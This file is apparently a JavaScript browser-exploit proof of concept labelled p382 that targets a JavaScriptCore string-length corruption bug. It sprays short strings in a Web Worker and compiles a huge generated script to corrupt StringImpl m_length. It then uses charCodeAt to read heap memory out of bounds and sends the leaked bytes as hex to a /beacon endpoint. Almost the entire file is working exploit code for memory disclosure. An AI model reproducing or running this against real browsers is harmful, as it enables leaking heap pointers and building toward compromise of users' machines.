// p382 - OOB heap read via m_length corruption on short strings
//
// V378 CONFIRMED: sweep corrupts StringImpl m_length at alignment 64.
// V379-V381 DEAD: AB backing stores in Gigacage, unreachable by sweep.
//
// NEW APPROACH: Allocate many SHORT strings in Worker (same pattern as V378).
// After compile, if m_length is corrupted to a LARGER value (bytecodeIndex),
// charCodeAt(original_length .. corrupted_length-1) reads past the string
// into adjacent heap memory. This leaks heap data including pointers.
//
// V378 chunk was 1000 chars -> m_length corrupted to 817 (SHRINK, no OOB).
// Using chunks of 30-200 chars: if bytecodeIndex > chunk size, we get OOB.
//
// Beacon prefix: V382-

(function() {
  var BQ = 0;
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V382-' + tag + '?t=' + Date.now() + '&q=' + (BQ++), false);
      x.send('');
    } catch(e) {
      try { new Image().src = '/beacon/V382-' + tag + '?t=' + Date.now(); } catch(e2) {}
    }
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  var workerCode = function() {
    var chunks = [];
    var baseUrl = '';

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V382-W-' + tag + '?t=' + Date.now(), false);
        x.send('');
      } catch(e) {}
    }
    function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }

      if (e.data.cmd === 'alloc') {
        // Allocate chunks of various sizes
        // Use sizes where bytecodeIndex is likely to exceed the chunk size
        // V378: 1000-char chunk -> bytecodeIndex=817 (SHRINK)
        // We want: short chunks where bytecodeIndex > chunk size (EXPAND = OOB)
        var sizes = [30, 50, 70, 90, 110, 130, 150, 200, 300, 500, 700, 800];
        for (var s = 0; s < sizes.length; s++) {
          for (var i = 0; i < 10; i++) {
            // Use different fill chars per size group for identification
            var fillChar = String.fromCharCode(65 + s); // A, B, C, ...
            var str = '';
            for (var j = 0; j < sizes[s]; j++) str += fillChar;
            str.charCodeAt(0); // flatten to 8-bit
            chunks.push({ str: str, size: sizes[s], tag: fillChar + s + '_' + i });
          }
        }
        beacon('CHUNKS-' + chunks.length);
        self.postMessage({ ready: true });
        return;
      }

      if (e.data.cmd === 'scan') {
        beacon('SCANNING');
        var oobCount = 0;
        var shrinkCount = 0;
        var okCount = 0;

        for (var i = 0; i < chunks.length; i++) {
          try {
            var c = chunks[i];
            var curLen = c.str.length;

            if (curLen !== c.size) {
              if (curLen > c.size) {
                // OOB READ! m_length expanded
                oobCount++;
                beacon('OOB-' + c.tag + '-was' + c.size + '-now' + curLen);

                // Read up to 100 bytes of OOB data
                var readTo = Math.min(curLen, c.size + 100);
                var hex = '';
                for (var j = c.size; j < readTo; j++) {
                  var cc = c.str.charCodeAt(j);
                  if (cc > 255) {
                    // 16-bit char, report as 2 bytes LE
                    hex += hexByte(cc & 0xFF) + hexByte((cc >> 8) & 0xFF);
                  } else {
                    hex += hexByte(cc);
                  }
                }
                // Split hex into beacon-safe chunks (max ~80 chars per beacon)
                for (var off = 0; off < hex.length; off += 60) {
                  beacon('D-' + c.tag + '-' + Math.floor(off/2) + '-' + hex.substring(off, off + 60));
                }

                // Also dump first 20 bytes of the string itself (should be fill chars)
                var pre = '';
                for (var j = 0; j < Math.min(curLen, 20); j++) {
                  pre += hexByte(c.str.charCodeAt(j));
                }
                beacon('PRE-' + c.tag + '-' + pre);

              } else {
                // SHRINK (like V378)
                shrinkCount++;
                beacon('SHRINK-' + c.tag + '-was' + c.size + '-now' + curLen);
              }
            } else {
              okCount++;
            }
          } catch(ex) {
            beacon('CRASH-' + i + '-' + (ex.message || '').substring(0, 30));
          }
        }

        beacon('RESULT-oob' + oobCount + '-shrink' + shrinkCount + '-ok' + okCount);
        beacon('DONE');
        self.postMessage({ done: true });
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  var baseUrl = location.protocol + '//' + location.host;
  worker.postMessage({ cmd: 'init', baseUrl: baseUrl });

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      build();
    }
    if (e.data.done) B('ALL-DONE');
  };

  worker.postMessage({ cmd: 'alloc' });

  function build() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var cc = 'a();'.repeat(CHUNK);
    var p = ['window.__p382fn=function(a){'];
    for (var c = 0; c < nC; c++) p.push(cc);
    p.push('a();'.repeat(rem));
    p.push('};window.__p382ok=true;');
    cc = null;
    var blob = new Blob(p, {type: 'application/javascript'});
    B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
    p = null;
    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onload = function() {
      B('COMPILED-' + (window.__p382ok ? 'OK' : 'FAIL'));
      worker.postMessage({ cmd: 'scan' });
    };
    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
